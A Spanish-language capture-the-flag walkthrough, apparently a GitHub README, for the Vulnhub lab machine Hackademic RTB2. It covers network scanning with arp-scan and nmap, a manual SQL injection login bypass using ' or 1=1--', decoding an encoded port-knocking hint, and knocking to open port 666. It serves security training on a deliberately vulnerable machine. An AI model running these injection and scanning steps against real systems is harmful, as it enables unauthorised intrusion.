<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=xd&size=50&color=3CF700FF&background=FF000000&width=500&height=80&lines=HACKADEMIC_RTB2"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/hackademic-rtb2,18/

<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/182723256-9616db47-6dcd-4884-a26f-0bd69b382d29.png"></h1>

</br>

- *Paso 1:* Identificación de la máquina en la red con ArpScan. 
```
arp-scan --interface eth0 -l
```
![2](https://user-images.githubusercontent.com/75953873/182723636-8e6a7d2c-7280-4742-a5b3-17660bdd6a2e.png)

IP host: `192.168.25.131`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.25.131
```
![3](https://user-images.githubusercontent.com/75953873/182724090-b60c5b67-0dd2-4a6c-83d7-01c541c00bef.png)

Puertos abiertos: [80,666]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 80,666 -A 192.168.25.131
```
![4](https://user-images.githubusercontent.com/75953873/182724516-60843d6c-3ed8-4307-8345-7431696978a3.png)

Servidor corriendo: **HTTP Apache**

O.S: Linux (**Ubuntu**)

URL del servidor: `http://192.168.25.131`

![5](https://user-images.githubusercontent.com/75953873/182724778-d685a545-04c9-4e41-8a49-3058067bc121.png)

- *Paso 4:* Bypassear página con inyección SQL manual. 

Username: `' or 1=1--'`

Password: `' or 1=1--'`

![6](https://user-images.githubusercontent.com/75953873/182725260-0ebeb8c5-c0af-465d-b520-69816fb8b37a.png)

![7](https://user-images.githubusercontent.com/75953873/182725313-445bffd4-699b-404c-9304-80a514377bfa.png)

Al inspeccionar el código fuente, la etiqueta `<font>` contiene un texto ofuscado a hexadecimal.

![9](https://user-images.githubusercontent.com/75953873/182725970-78c8a7d8-80ea-4298-906f-7b8e9a898268.png)

```
%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
```

- *Paso 5:* Decodificar mensaje de forma Online y con BurpSuite. 

**ONLINE:** https://www.online-toolz.com/langs/es/tool-es-text-hex-convertor.html

![10](https://user-images.githubusercontent.com/75953873/182726252-e5756ba4-5cf6-44ce-92a1-76971760b4d8.png)

**BURPSUITE:**

Decoder:
```
[Text] -> Decode as -> URL
[Hex] -> Decode as -> ASCII hex
[Text] -> Decode as -> Plain
```
![11](https://user-images.githubusercontent.com/75953873/182727019-7c7f2896-8299-42f1-ba58-d6e69c1d6545.png)

Decodificar cadena binaria: https://www.traductorbinario.com/
```
0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1 
```

![12](https://user-images.githubusercontent.com/75953873/182727491-9cdcf046-d840-4923-a7fd-1c5d0258a98c.png)

- *Paso 6:* Acceder al puerto 666 golpeado recursivamente los puertos `1001,1101,1011,1001` con Nmap. }
```
nmap -r -p 1001,1101,1011,1001 192.168.25.131
```
![13](https://user-images.githubusercontent.com/75953873/182728017-cd632ee0-4ae2-4f7e-8e8e-f78ee7450ebd.png)

URL con el puerto 666 abuerto: `http://192.168.25.131:666`

![14](https://user-images.githubusercontent.com/75953873/182728213-b629fc94-5457-4086-b57d-f5b01b3aeb2a.png)
